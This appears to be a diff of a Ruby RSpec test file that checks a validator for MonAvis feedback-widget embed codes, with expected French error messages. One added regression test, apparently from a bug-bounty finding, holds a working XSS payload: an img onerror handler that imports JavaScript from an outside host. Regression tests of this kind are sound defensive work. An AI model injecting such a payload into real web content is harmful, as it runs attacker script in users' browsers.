@@ -343,21 +343,16 @@ describe Procedure do
     end
 
     context 'monavis' do
-      context 'nil is allowed' do
-        it do
-          is_expected.to allow_value(nil).for(:monavis_embed)
-          is_expected.to allow_value('').for(:monavis_embed)
-        end
-      end
+      subject { procedure.tap { it.validate(:publication) }.errors.full_messages }
 
       context 'random string is not allowed' do
         let(:procedure) { build(:procedure, monavis_embed: "plop") }
-        it { expect(procedure.valid?).to eq(false) }
+        it { is_expected.to eq(["Le code MonAvis doit comporter un lien", "Le code MonAvis doit comporter une image"]) }
       end
 
       context 'random html is not allowed' do
         let(:procedure) { build(:procedure, monavis_embed: '<img src="http://some.analytics/hello.gif">') }
-        it { expect(procedure.valid?).to eq(false) }
+        it { is_expected.to include("Le code MonAvis contient une image pointont vers un domaine invalide") }
       end
 
       context 'Monavis embed code with white button is allowed' do
@@ -367,7 +362,7 @@ describe Procedure do
         </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_blanc) }
-        it { expect(procedure.valid?).to eq(true) }
+        it { is_expected.to eq([]) }
       end
 
       context 'Monavis embed code with blue button is allowed' do
@@ -377,7 +372,7 @@ describe Procedure do
         </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_bleu) }
-        it { expect(procedure.valid?).to eq(true) }
+        it { is_expected.to eq([]) }
       end
 
       context 'Monavis embed code with voxusages is allowed' do
@@ -387,7 +382,7 @@ describe Procedure do
         </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_issue_phillipe) }
-        it { expect(procedure.valid?).to eq(true) }
+        it { is_expected.to eq([]) }
       end
 
       context 'Monavis embed code without title allowed' do
@@ -397,7 +392,7 @@ describe Procedure do
           </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_issue_bouchra) }
-        it { expect(procedure.valid?).to eq(true) }
+        it { is_expected.to eq([]) }
       end
 
       context 'Monavis embed code with jedonnemonavis' do
@@ -407,7 +402,7 @@ describe Procedure do
           </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_jedonnemonavis) }
-        it { expect(procedure.valid?).to eq(true) }
+        it { is_expected.to eq([]) }
       end
 
       context 'Monavis embed code with kthxbye' do
@@ -417,7 +412,16 @@ describe Procedure do
           </a>
         MSG
         let(:procedure) { build(:procedure, monavis_embed: monavis_jedonnemonavis) }
-        it { expect(procedure.valid?).to eq(false) }
+        it { is_expected.to eq(["Le code MonAvis contient un lien pointant vers un domaine invalide"]) }
+      end
+
+      context 'when YWH-PGM5381-46 pentester won' do
+        monavis_ywh_pgm5381_46 = <<-MSG
+         <a href="https://monavis.numerique.gouv.fr/Demarches/123456?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d4"></a>
+         <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.pngx" alt="x" onerror=import('https://hks.ec/ATOXSS-ze4fzfze54.js') />
+        MSG
+        let(:procedure) { build(:procedure, monavis_embed: monavis_ywh_pgm5381_46) }
+        it { is_expected.to eq(["Le code MonAvis contient un attribut interdit : onerror"]) }
       end
     end
 
